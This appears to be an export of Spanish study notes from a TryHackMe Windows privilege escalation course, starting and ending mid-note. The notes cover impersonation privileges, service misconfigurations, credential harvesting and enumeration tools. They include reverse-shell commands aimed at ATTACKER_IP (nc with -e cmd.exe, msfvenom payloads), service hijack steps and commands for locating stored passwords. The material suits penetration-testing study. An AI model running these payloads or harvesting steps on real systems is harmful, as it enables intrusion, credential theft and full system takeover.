ejemplo de arriba, el DACL de los archivos de Bill no permite a \"ftp\" acceder a ellos. Esto requiere configuraci√≥n extra y a√±ade complejidad.\n- Para el sistema operativo, todos los archivos son accedidos por \"ftp\", sin importar el usuario actual. Esto hace imposible delegar la autorizaci√≥n al sistema operativo por lo que FTP debe implementarla.\n- Si el servicio FTP es comprometido, el atacante gana acceso inmediatamente a todos los archivos a los que tenga acceso \"ftp\".\n\nSi, por otro lado, el usuario \"ftp\" tiene el privilegio SeImpersonate o SeAssignPrimaryToken, todo esto se simplifica ya que el servicio FTP puede tomar temporalmente el token del usuario que accede y usarlo para realizar cualquier tarea en su nombre.\n\n![[Pasted image 20251130164854.png]]\n\nAhora, si el usuario Ann inicia sesi√≥n en el servicio FTP, y dado que el usuario ftp tiene privilegios de impersonation, puede tomar prestado el token de Ann y usarlo para acceder a sus archivos. De esta manera, no necesitamos dar permisos de acceso al usuario ftp. Mientras el servidor se hace pasar por Ann, no podr√° acceder a archivos de ning√∫n otro usuario para los que Ann no tenga permisos.\n\nComo atacantes, si conseguimos tomar control de un proceso con SeImpersonate o SeAssignPrimaryToken, podemos hacernos pasar por cualquier usuario que se conecte y autentifique.\n\nEn los sistemas Windows, los usuarios LOCAL SERVICE y NETWORK SERVICE ACCOUNTS ya tienen dichos privilegios. IIS tambi√©n crear√° una cuenta similar llamada \"iisapppool\\defaultapppool\" para aplicaciones web.\n\nPara elevar privilegios usando dichas cuentas, un atacante necesita hacer lo siguiente:\n\n1. Spawnear un proceso para que los usuarios puedan conectarse y autentificarse.\n2. Encontrar una manera de forzar que los usuarios privilegiados se conecten y autentifiquen.\n\nUsaremos el exploit RogueWinRM para conseguir ambas condiciones.\n\nEmpecemos asumiendo que ya hemos comprometido una p√°gina corriendo en un IIS y que hemos plantado una webshell en la siguiente direcci√≥n:  `http://<ip>`\n\nPodemos usar la webshell para comprobar si tenemos privilegios en la cuenta comprometida y confirmar que tenemos ambos privilegios:\n\n![[Pasted image 20251130171345.png]]\n\nPara usar RogueWinRM, necesitamos subir el exploit a la m√°quina v√≠ctima.\n\nEste exploit es posible porque siempre que un usuario (incluyendo los no privilegiados) arrancan el servicio BITS en Windows, autom√°ticamente crea una conexi√≥n al puerto 5985 usando privilegios de SYSTEM. Este puerto se usa t√≠picamente para el servicio WinRM, que es un puerto que expone una powershell para ser usada de forma remota. Es como SSH pero usando powershell.\n\nSi por alguna raz√≥n el servicio WinRM no est√° corriendo en el servidor objetivo, un atacante podr√≠a arrancar un servicio WinRM falso en dicho puerto y capturar el intento de autentificaci√≥n hecho por el servicio BITS al empezar. Si el atacante tiene privilegios SeImpersonate puede ejecutar cualquier comando en nombre del usuario que ese conecte, que es SYSTEM.\n\nAntes de ejecutar el exploit, arrancamos un listener en nuestra m√°quina con `nc -lvp 4442`.\n\nY luego usamos nuestra propia webshell para usar el exploit con el siguiente comando.\n\n`c:\\tools\\RogueWinRM\\RogueWinRM.exe -p \"C:\\tools\\nc64.exe\" -a \"-e cmd.exe ATTACKER_IP 4442\"`\n\n![[Pasted image 20251130192516.png]]\n\n>[!IMPORTANT] El exploit puede tardar hasta 2 minutos en funcionar, ten paciencia.\n\n- `-p`: Especifica el ejecutable a ejecutar por el exploit.\n- `-a`: Se usa para pasar argumentos al ejecutable.\n\nSi lo hicimos bien, recibiremos la consola.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Abusing Service Misconfigurations",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/3-windows-privilege-escalation/4-abusing-service-misconfigurations/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/4. Abusing Service Misconfigurations.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 3. Windows Privilege Escalation",
    "content": "<h2>Windows Services</h2>\nLos servicios de Windows son manejados por el **Service Control Manager** (SCM). El SCM es un proceso a cargo de gestionar el estado de los servicios como se necesite, comprobar el estado de cualquier servicio indicado y ofrecer una forma de configurar servicios.\n\nCada proceso en Windows tiene asociado un ejecutable que ser√° ejecutado por el SCM cuando se inicie el servicio. Los servicios y ejecutables implementan funciones especiales para ser capaces de comunicarse con el SCM por lo que no cualquier ejecutable puede ser arrancado como servicio exitosamente. Cada servicio especifica tambi√©n la cuenta de usuario bajo la que correr√°.\n\nPara entender mejor la estructura de un servicio, nos fijaremos en la configuraci√≥n del servicio `apphostsvc` con el comando `sc qc`:\n\n```cmd\nC:\\> sc qc apphostsvc\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: apphostsvc\n        TYPE               : 20  WIN32_SHARE_PROCESS\n        START_TYPE         : 2   AUTO_START\n        ERROR_CONTROL      : 1   NORMAL\n        BINARY_PATH_NAME   : C:\\Windows\\system32\\svchost.exe -k apphost\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : Application Host Helper Service\n        DEPENDENCIES       :\n        SERVICE_START_NAME : localSystem\n```\n\nAqu√≠ podemos ver que el ejecutable asociado se especifica a trav√©s del par√°metro **BINARY_PATH_NAME** y la cuenta usada para correr el servicio se muestra en el par√°metro **SERVICE_START_NAME**.\n\nLos servicios tienen una Lista de Control de Acceso Discrecional (DACL), la cual indica qui√©n tiene permiso para empezar, parar, pausar, ver el estado, la configuraci√≥n o reconfigurar el servicio entre otros privilegios. Puedes ver el DACL a trav√©s el \"Process Hacker\" en el escritorio de la m√°quina ofrecida.\n\n![[Pasted image 20251128225827.png]]\n\nTodas las configuraciones de servicios se pueden guardar en el registro bajo `HKLM\\SYSTEM\\CurrentControlSet\\Services\\`:\n\n![[Pasted image 20251128225919.png]]\n\nExiste una subclave para cada servicio en el sistema. Podemos ver el ejecutable asociado en el valor **ImagePath** y la cuenta usada para comenzar el servicio en el valor **ObjectName**. Si DACL ha sido configurado para nuestro servicio, ser√° almacenado en una subclave llamada **Security**. S√≥lo los administradores pueden modificar dicho registro.\n\n------------------------------\n<h2>Insecure Permissions on Service Executable</h2>\nSi el ejecutable asociado con un servicio tiene permisos d√©biles que nos permiten editarlo o reemplazarlo, podemos ganar los privilegios de la cuenta ejecutora.\n\nPara entender c√≥mo funciona esto, miremos una vulnerabilidad encontrada en el Splinterware System Scheduler. Para empezar, veremos la configuraci√≥n del servicio usando `sc`:\n\n```cmd\nC:\\> sc qc WindowsScheduler\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: windowsscheduler\n        TYPE               : 10  WIN32_OWN_PROCESS\n        START_TYPE         : 2   AUTO_START\n        ERROR_CONTROL      : 0   IGNORE\n        BINARY_PATH_NAME   : C:\\PROGRA~2\\SYSTEM~1\\WService.exe\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : System Scheduler Service\n        DEPENDENCIES       :\n        SERVICE_START_NAME : .\\svcuser1\n```\n\nPodemos ver que el servicio instalado por el software vulnerable corre como `svcuser1` y el ejecutable asociado con el servicio es `C:\\Progra~2\\System~11\\WServicr.exe`. Ahora tenemos que comprobar los permisos del ejecutable:\n\n```cmd\nC:\\Users\\thm-unpriv>icacls C:\\PROGRA~2\\SYSTEM~1\\WService.exe\nC:\\PROGRA~2\\SYSTEM~1\\WService.exe Everyone:(I)(M)\n                                  NT AUTHORITY\\SYSTEM:(I)(F)\n                                  BUILTIN\\Administrators:(I)(F)\n                                  BUILTIN\\Users:(I)(RX)\n                                  APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)\n                                  APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)\n\nSuccessfully processed 1 files; Failed processing 0 files\n```\n\nY aqu√≠ vemos algo interesante, todo el mundo (grupo Everyone) tiene permiso para modificar el archivo ejecutable. Esto significa que podemos sobrescribirlo o reemplazarlo para que se ejecute un payload con los permisos del usuario.\n\nGeneraremos un payload de servicio exe usando msfvenom y lo compartiremos mediante python:\n\n```cmd\nuser@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe\n\nuser@attackerpc$ python3 -m http.server\nServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n```\n\nLuego nos lo descargamos en la m√°quina objetivo:\n\n`wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe`\n\nUna vez que el payload est√© en el servidor, lo reemplazamos por el binario leg√≠timo. Como necesitamos que otro usuario lo ejecute, le tenemos que dar permisos suficientes.\n\n```cmd\nC:\\> cd C:\\PROGRA~2\\SYSTEM~1\\\n\nC:\\PROGRA~2\\SYSTEM~1> move WService.exe WService.exe.bkp\n        1 file(s) moved.\n\nC:\\PROGRA~2\\SYSTEM~1> move C:\\Users\\thm-unpriv\\rev-svc.exe WService.exe\n        1 file(s) moved.\n\nC:\\PROGRA~2\\SYSTEM~1> icacls WService.exe /grant Everyone:F\n        Successfully processed 1 files.\n```\n\nArrancamos un listener en la m√°quina atacante:\n\n`nc -lvp 4445`\n\nY esperamos.\n\n```bash\nuser@attackerpc$ nc -lvp 4445\nListening on 0.0.0.0 4445\nConnection received on 10.10.175.90 50649\nMicrosoft Windows [Version 10.0.17763.1821]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>whoami\nwprivesc1\\svcusr1\n```\n\n------------------------------------\n<h2>Unquoted Service Paths</h2>\nCuando no podemos escribir directamente en el ejecutable del servicio como antes, puede que siga habiendo una manera de ejecutar ejecutables arbitrarios usando una funcionalidad oculta.\n\nAl trabajar con servicios Windows, ocurre un comportamiento bastante peculiar cuando el servicio est√° configurado para apuntar a un ejecutable que no est√° citado de manera exacta. Por ejemplo, que no tenga en cuenta los espacios, etc.\n\nComo ejemplo, miremos la diferencia entre dos servicios. El primer servicio est√° bien quoteado y el segundo no.\n\nPrimer servicio:\n\n```powershell\nC:\\> sc qc \"vncserver\"\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: vncserver\n        TYPE               : 10  WIN32_OWN_PROCESS\n        START_TYPE         : 2   AUTO_START\n        ERROR_CONTROL      : 0   IGNORE\n        BINARY_PATH_NAME   : \"C:\\Program Files\\RealVNC\\VNC Server\\vncserver.exe\" -service\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : VNC Server\n        DEPENDENCIES       :\n        SERVICE_START_NAME : LocalSystem\n```\n\n>[!NOTE] F√≠jate en las comillas en el servicio.\n\nSegundo servicio:\n\n```powershell\nC:\\> sc qc \"disk sorter enterprise\"\n[SC] QueryServiceConfig SUCCESS\n\nSERVICE_NAME: disk sorter enterprise\n        TYPE               : 10  WIN32_OWN_PROCESS\n        START_TYPE         : 2   AUTO_START\n        ERROR_CONTROL      : 0   IGNORE\n        BINARY_PATH_NAME   : C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe\n        LOAD_ORDER_GROUP   :\n        TAG                : 0\n        DISPLAY_NAME       : Disk Sorter Enterprise\n        DEPENDENCIES       :\n        SERVICE_START_NAME : .\\svcusr2\n```\n\nCuando el SCM intenta ejecutar el binario asociado, surge un problema. Debido a que hay espacios en el nombre del directorio `Disk Sorter Enterprise`, el comando se vuelve ambiguo y SCM no sabe cual de los siguientes est√°s intentando ejecutar:\n\n| Command                                              | Argument 1                 | Argument 2                 |\n| ---------------------------------------------------- | -------------------------- | -------------------------- |\n| C:\\MyPrograms\\Disk.exe                               | Sorter                     | Enterprise\\bin\\disksrs.exe |\n| C:\\MyPrograms\\Disk Sorter.exe                        | Enterprise\\bin\\disksrs.exe |                            |\n| C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe |                            |                            |\n\nEsto se debe a la forma de parsear los comandos. Cuando tu ejecutas un comando, normalmente estos espacios son separadores a no ser que se escapen correctamente.\n\nEn lugar de crashear, SCM intenta ayudar al usuario y empieza a buscar los binarios en el orden de la lista de arriba.\n\nDebido a este comportamiento, podemos crear cualquiera de los dos primeros ejecutables buscados por el programa que fuercen la ejecuci√≥n de un ejecutable malicioso.\n\nAunque parece trivial, por lo general no es realizable la explotaci√≥n de esta vulnerabilidad ya que los programas suelen guardarse bajo la ruta `C:\\Program Files` o `C:\\Program Files (x86)` por defecto, la cual no es escribible.\n\n>[!IMPORTANT] Esta vulnerabilidad s√≥lo es explotable cuando el administrador ha decidido guardar los programas en una ruta alternativa que tiene permisos de escritura.\n\nEn nuestro caso, el administrador los instala en `C:\\MyPrograms`. Por defecto, hereda los permisos del directorio `C:\\`, permitiendo a cualquier usuario crear archivos y directorios dentro. Lo comprobamos usando `icacls`:\n\n```powershell\nC:\\>icacls c:\\MyPrograms\nc:\\MyPrograms NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F)\n              BUILTIN\\Administrators:(I)(OI)(CI)(F)\n              BUILTIN\\Users:(I)(OI)(CI)(RX)\n              BUILTIN\\Users:(I)(CI)(AD)\n              BUILTIN\\Users:(I)(CI)(WD)\n              CREATOR OWNER:(I)(OI)(CI)(IO)(F)\n\nSuccessfully processed 1 files; Failed processing 0 files\n```\n\nEl grupo `BUILTIN\\\\Users` tiene privilegios `AD` y `WD`, permitiendo al usuario crear subdirectorios y archivos, respectivamente.\n\nRealizamos el mismo proceso que antes para crear un payload de servicio exe con `msfvenom` y lo subimos a la m√°quina.\n\n```bash\nuser@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe\n\nuser@attackerpc$ nc -lvp 4446\n```\n\nUna vez tenemos el payload en el servidor, lo movemos a `C:\\MyPrograms\\Disk.exe` y le damos a Everyone permisos full (F) sobre el archivo para asegurarnos de que puede ser ejecutado.\n\n```powershell\nC:\\> move C:\\Users\\thm-unpriv\\rev-svc2.exe C:\\MyPrograms\\Disk.exe\n\nC:\\> icacls C:\\MyPrograms\\Disk.exe /grant Everyone:F\n        Successfully processed 1 files.\n```\n\nUna vez que el servicio se reinicie se ejecutar√° el payload. Como resultado obtendremos una shell con privilegios `svcusr2`.\n\n```bash\nuser@attackerpc$ nc -lvp 4446\nListening on 0.0.0.0 4446\nConnection received on 10.10.175.90 50650\nMicrosoft Windows [Version 10.0.17763.1821]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>whoami\nwprivesc1\\svcusr2\n```\n\n--------------------------------------\n<h2>Insecure Service Permissions</h2>\nPuede que sigas teniendo alguna remota posibilidad de aprovecharte del servicio incluso si el DACL del ejecutable est√° bien configurado, y el path del binario del servicio bien quoteado. Si el DACL del servicio (no el DACL del ejecutable del servicio) te permite modificar la configuraci√≥n de un servicio, ser√°s capaz de reconfigurar el servicio. Esto te permitir√° apuntar a cualquier ejecutable que quieras y ejecutarlo incluso con la cuenta SYSTEM.\n\nPara comprobar el DACL del servicio desde la linea de comandos, puedes usar [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) de la suite Sysinternals.\n\n```powershell\nC:\\tools\\AccessChk> accesschk64.exe -qlc thmservice\n  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\\SYSTEM\n        SERVICE_QUERY_STATUS\n        SERVICE_QUERY_CONFIG\n        SERVICE_INTERROGATE\n        SERVICE_ENUMERATE_DEPENDENTS\n        SERVICE_PAUSE_CONTINUE\n        SERVICE_START\n        SERVICE_STOP\n        SERVICE_USER_DEFINED_CONTROL\n        READ_CONTROL\n  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\\Users\n        SERVICE_ALL_ACCESS\n```\n\nAqu√≠ podemos ver que el grupo `BUILTIN\\\\Users` tiene el permiso **SERVICE_ALL_ACCESS**, lo que significa que cualquier usuario puede reconfigurar el servicio.\n\nAntes de cambiar el servicio, creamos y compartimos el payload de servicio exe con `msfvenom`:\n\n```bash\nuser@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe\n\nuser@attackerpc$ nc -lvp 4447\n```\n\nLo transferimos a `C:\\Users\\thm-unpriv\\rev-svc3.exe`. Le tenemos que dar permisos para que cualquiera pueda hacerlo tofo (F):\n\n`icacls C:\\Users\\thm-unpriv\\rev-svc3.exe /grant Everyone:F`\n\nPara cambiar el ejecutable y cuenta asociado al servicio, podemos usar el siguiente comando.\n\n>[!CAUTION] F√≠jate en los espacios despu√©s de los signos igual al usar `sc.exe`.\n\n```powershell\nC:\\> sc config THMService binPath= \"C:\\Users\\thm-unpriv\\rev-svc3.exe\" obj= LocalSystem\n```\n\nComo podemos usar cualquier cuenta para correr el ejecutable, seleccionamos LocalSystem ya que es la cuenta disponible con los privilegios m√°s elevados. Reiniciamos el servicio:\n\n```powershell\nC:\\> sc stop THMService\nC:\\> sc start THMService\n```\n\nY recibiremos la shell.\n\n```bash\nuser@attackerpc$ nc -lvp 4447\nListening on 0.0.0.0 4447\nConnection received on 10.10.175.90 50650\nMicrosoft Windows [Version 10.0.17763.1821]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>whoami\nNT AUTHORITY\\SYSTEM\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Harvesting Passwords from Usual Spots",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/3-windows-privilege-escalation/2-harvesting-passwords-from-usual-spots/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/2. Harvesting Passwords from Usual Spots.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 3. Windows Privilege Escalation",
    "content": "La manera m√°s f√°cil de conseguir acceso a otro usuario es conseguir credenciales en una m√°quina comprometida. Aqu√≠ presentaremos algunos sitios donde buscar contrase√±as en un sistema Windows.\n\n------------------------------------\n<h2>Unattended Windows Installations</h2>\nAl instalar Windows en un gran n√∫mero de hosts, los administradores pueden usar los Servicios de Despliegue de Windows, que permiten desplegar una sola imagen de SO a varios hosts a trav√©s de la red. Este tipo de instalaciones se llaman \"unattended installations\" ya que no requieren interacci√≥n del usuario. Requieren el uso de una cuenta administradora para realizar la configuraci√≥n inicial, que puede acabar siendo guardada en alguna de las siguientes localizaciones:\n\n- `C:\\Unattend.xml`\n- `C:\\Windows\\Panther\\Unattend.xml`\n- `C:\\Windows\\Panther\\Unattend\\Unattend.xml`\n- `C:\\Windows\\system32\\sysprep.inf`\n- `C:\\Windows\\system32\\sysprep\\sysprep.xml`\n\nComo parte de estos archivos puedes encontrar credenciales.\n\n```xml\n<Credentials>\n    <Username>Administrator</Username>\n    <Domain>thm.local</Domain>\n    <Password>MyPassword123</Password>\n</Credentials>\n```\n\n---------------------------------------\n<h2>Powershell History</h2>\nCuando un usuario ejecuta un comando usando Powershell, se almacena en un archivo que tiene una memoria de comandos pasados. Es √∫til para repetir comandos que hayas usado antes r√°pidamente. Si un usuario ejecuta un comando que contiene una contrase√±a como parte directamente, puede ser recuperado despu√©s usando el siguiente comando desde `cmd.exe`.\n\n`type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt`\n\n>[!CAUTION] Este comando s√≥lo funciona desde `cmd.exe`.\n\n----------------------------------------\n<h2>Saved Windows Credentials</h2>\nWindows nos permite usar las credenciales de otro usuario. Esta funci√≥n tambi√©n nos da la opci√≥n de guardar estas credenciales en el sistema. El siguiente comando lista las credenciales guardadas.\n\n`cmdkey /list`\n\nAunque no puedes ver las contrase√±as en s√≠, si ves que hay credenciales que merece la pena probar puedes hacerlo con el comando `runas` de la siguiente manera:\n\n`runas /savecred /user:admin cmd.exe`\n\n-------------------------------------\n<h2>IIS Configuration</h2>\nInternet Information Services (Servicios de Informaci√≥n de Internet) es el servidor web por defecto de las instalaciones Windows. La configuraci√≥n de los sitios web en IIS se almacena en un archivo llamado `web.config` y puede guardar contrase√±as para bases de datos o mecanismos de autentificaci√≥n configurados. Dependiendo de la versi√≥n instalada de IIS, podemos encontrar `web.config` en alguno de los siguientes ficheros:\n\n- `C:\\inetpub\\wwwroot\\web.config`\n- `C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config`\n\nAqu√≠ tienes un modo r√°pido de encontrar strings de conexiones a bases de datos en el archivo:\n\n`type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString`\n\n---------------------------------------\n<h2>Retrieve Credentials from Software: PuTTY</h2>\nPuTTY es un cliente SSH com√∫nmente encontrado en sistemas Windows. En vez de tener que especificar par√°metros de conexi√≥n cada vez, los usuarios pueden guardar sesiones donde la IP, usuario y otras configuraciones pueden guardarse para m√°s adelante. Aunque PuTTY no permite a los usuarios guardar la contrase√±a SSH, guarda configuraciones proxy que pueden incluir credenciales de autentificaci√≥n en texto plano.\n\nPara recuperar las credenciales proxy guardadas, puedes buscar bajo la siguiente clave de registro por la ProxyPassword con el siguiente comando:\n\n`reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /s`\n\n>[!NOTE] Simon Tatham es el creador de PuTTY y su nombre forma parte del path, no es un nombre de usuario.\n\nAl igual que PuTTY, cualquier software que almacene contrase√±as, incluyendo navegadores, clientes de email o de FTP o SSH, tendr√° m√©todos para recuperar las contrase√±as guardadas.\n\n>[!TIP] Para entrar en una m√°quina Windows con `xfreerdp3` utiliza el siguiente comando: `xfreerdp3 /dynamic-resolution +clipboard /cert:ignore /v:10.82.139.185 /u:<usuario> /p:'<contrase√±a>'`",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Windows Privilege Escalation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/3-windows-privilege-escalation/1-windows-privilege-escalation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/1. Windows Privilege Escalation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 3. Windows Privilege Escalation",
    "content": "Dicho de manera simple, la escalada de privilegios consiste en usar el acceso dado a un host con el usuario A para ganar acceso al usuario B para, eventualmente, obtener permisos de administrador. Aunque queremos llegar a root, puede que tengamos que escalar a otras cuentas intermedias (sin privilegios) antes de encontrar un vector de escalada a root.\n\nGanar acceso a las diferentes cuentas puede ser tan simple como encontrar credenciales en archivos de texto u hojas de c√°lculo, pero ese no siempre ser√° el caso.\n\nDependiendo de la situaci√≥n podemos necesitar abusar alguna de las siguientes debilidades:\n\n- Malas configuraciones en servicios de Windows o tareas programadas.\n- Privilegios excesivos otorgados a nuestra cuenta.\n- Software vulnerable.\n- Perderse parches de seguridad de Windows.\n\nAntes de ver las t√©cnicas, echemos un vistazo a diferentes tipos de cuenta en un sistema Windows.\n\n---------------------------------------------\n<h2>Usuarios de Windows</h2>\nLos sistemas Windows tienen principalmente 2 tipos de usuarios. Dependiendo del nivel de acceso, podemos categorizarlos en:\n\n| Usuario            | Explicaci√≥n                                                                                                                                                                                              |\n| ------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| **Administrators** | Estos usuarios tienen los mayores privilegios. Pueden cambiar cualquier par√°metro de configuraci√≥n y acceder a cualquier archivo del sistema.                                                            |\n| **Standard Users** | Estos usuarios pueden acceder al ordenador pero s√≥lo realizar tareas limitadas. T√≠picamente estos usuarios no pueden hacer cambios permanentes o esenciales al sistema y est√°n limitados a sus archivos. |\n\nCualquier usuario con privilegios administrativos, ser√° parte del grupo **Administrators**. Por el otro lado, aquellos usuarios est√°ndar ser√°n parte del grupo **Users**.\n\nEn adici√≥n a eso, normalmente escuchar√°s sobre algunas cuentas especialmente construidas usadas por el sistema operativo en el contexto de la escalada de privilegios.\n\n| Usuario                  | Explicaci√≥n                                                                                                                                                                           |\n| ------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| **SYSTEM / LocalSystem** | Una cuenta usada por el sistema operativo para realizar tareas internas. Tiene accesos totales a los archivos y recursos disponibles en el host incluso con privilegios m√°s elevados. |\n| **Local Service**        | Cuenta usada por defecto para correr servicios de Windows con los m√≠nimos privilegios posibles. Usar√° conexiones an√≥nimas en la red.                                                  |\n| **Network Service**      | Cuenta por defecto usada para correr servicios de Windows con los m√≠nimos privilegios posibles. Usar√° credenciales para autentificarse a trav√©s de la red.                            |\n\nEstas cuentas se crean y se gestionan por Windows y no ser√°s capaz de usarlas como cuentas normales. Aunque en algunas situaciones puedes ganar sus privilegios debido a la explotaci√≥n de ciertos servicios.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Tools of the Trade",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/3-windows-privilege-escalation/7-tools-of-the-trade/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/7. Tools of the Trade.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 3. Windows Privilege Escalation",
    "content": "Existen muchos scripts que realizan enumeraci√≥n del sistema de manera similar a los que hemos visto en tareas anteriores. Estas herramientas pueden acortar el proceso de enumeraci√≥n y revelar diferentes vectores potenciales de escalada de privilegios. Aunque debes recordar que puede perderse algunos.\n\nDebajo hay algunas de las herramientas m√°s com√∫nmente utilizadas.\n\n----------------------------\n<h2>WinPEAS</h2>\nEs un script desarrollado para enumerar el sistema objetivo para descubrir vectores de escalada de privilegios. Puedes encontrar WinPEAS [aqu√≠](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS). Es buena idea redirigir el output a un archivo debido a su voluminosidad.\n\n----------------------------\n<h2>PrivescCheck</h2>\nEs un script de PowerShell que busca vectores de escalada de privilegios en el sistema objetivo. Ofrece una alternativa a WinPEAS sin requerir la ejecuci√≥n de un binario. Puedes encontrarlo [aqu√≠](https://github.com/itm4n/PrivescCheck). \n\n>[!NOTE] Puede que para poder ejecutarlo necesites sobrepasar las pol√≠ticas de ejecuci√≥n, usa `Set-ExecutionPolicy`.\n\n\n```powershell\nPS C:\\> Set-ExecutionPolicy Bypass -Scope process -Force\nPS C:\\> . .\\PrivescCheck.ps1\nPS C:\\> Invoke-PrivescCheck\n```\n\n\n---------------------------------\n<h2>WES-NG: Windows Exploit Suggester - Next Generation</h2>\nAlgunos scripts de sugerencia de exploits requerir√°n que los subas al sistema objetivo y los ejecutes. Esto puede hacer que software antivirus lo detecte y elimine. Para evitar hacer ruido innecesario que pueda atraer atenci√≥n, puede que prefieras usar WES-NG, que correr√° en tu m√°quina.\n\nWES-NG es un script de Python que puedes encontrar [aqu√≠](https://github.com/bitsadmin/wesng).\n\nUna vez instalado, y antes de usarlo, escribe `wes.py --update` para actualizar la base de datos. El script se referir√° a la base de datos que crea para comprobar parches faltantes que puedan resultar en vulnerabilidades en el sistema.\n\nPara usar el script debes ejecutar el comando `systeminfo` en el equipo objetivo. No olvides redirigirlo a un archivo. Una vez hecho esto, puedes ejecutar lo siguiente:\n\n```bash\nuser@kali$ wes.py systeminfo.txt\n```\n\n------------------------------------------\n<h2>Metasploit</h2>\nSi ya tienes una shell Meterpreter en el sistema objetivo, puedes usar el m√≥dulo `multi/recon/local_exploit_suggester` para listar vulnerabilidades que pueden afectar al sistema dado.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Other Quick Wins",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/3-windows-privilege-escalation/3-other-quick-wins/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/3. Other Quick Wins.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 3. Windows Privilege Escalation",
    "content": "La escalada de privilegios no siempre es un reto. A veces las malas configuraciones pueden permitirte obtener privilegios elevados. Los siguientes escenarios pertenecen m√°s a los CTF que a los escenarios de la vida real. Sin embargo, si los m√©todos anteriores fallan, no pierdes nada probando estos.\n\n--------------------------------------\n<h2>Scheduled Tasks</h2>\nMirando en las tareas programadas del sistema objetivo, puedes ver alguna tarea programada que haya perdido su binario o est√© usando un binario que puedas modificar.\n\nLas tareas programadas pueden ser listadas desde la linea de comandos usando el comando `schtasks` sin opciones. Para recuperar informaci√≥n detallada sobre cualquier servicio, puedes usar un comando como el siguiente:\n\n```cmd\nC:\\> schtasks /query /tn vulntask /fo list /v\nFolder: \\\nHostName:                             THM-PC1\nTaskName:                             \\vulntask\nTask To Run:                          C:\\tasks\\schtask.bat\nRun As User:                          taskusr1\n```\n\nRecibir√°s mucha informaci√≥n, pero lo que nos interesa a nosotros es el par√°metro \"Task to run\", que indica lo que se ejecuta por la tarea programada y el par√°metro \"Run As User\" que muestra qu√© usuario ejecutar√° la tarea.\n\nSi nuestro usuario actual puede modificar o sobrescribir el ejecutable listado en \"Task to Run\", podemos controlar lo que se ejecuta, resultando en una escalada de privilegios. Para comprobar los permisos del archivo ejecutable podemos usar `icacls`:\n\n```cmd\nC:\\> icacls c:\\tasks\\schtask.bat\nc:\\tasks\\schtask.bat NT AUTHORITY\\SYSTEM:(I)(F)\n                    BUILTIN\\Administrators:(I)(F)\n                    